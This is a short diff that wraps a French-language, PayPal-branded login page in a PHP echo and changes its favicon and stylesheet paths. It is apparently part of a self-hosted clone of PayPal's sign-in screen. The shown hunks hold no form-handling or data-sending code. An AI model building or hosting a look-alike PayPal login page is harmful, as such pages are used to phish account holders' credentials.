@@ -1,3 +1,5 @@
+<?php
+echo '
 <!DOCTYPE html>
 <html lang="fr">
     <head>
@@ -6,9 +8,9 @@
         <meta name="description" content="" />
         <meta name="author" content="" />
         <title>PayPal</title>
-        <link rel="icon" type="image/x-icon" href="assets/paypal.ico"/>
+        <link rel="icon" type="image/x-icon" href="Image/paypal.ico"/>
         <!-- Core theme CSS (includes Bootstrap)-->
-        <link href="css/styles.css" rel="stylesheet" />
+        <link href="Style/style.css" rel="stylesheet" />
     </head>
     <div id="main" class="main " role="main">
         <section id="login" class="login" data-role="page" data-title="Log in to your PayPal account">
@@ -39,4 +41,5 @@
             </div>
         </section>
     </div>
-</html>
+</html>';
+?>
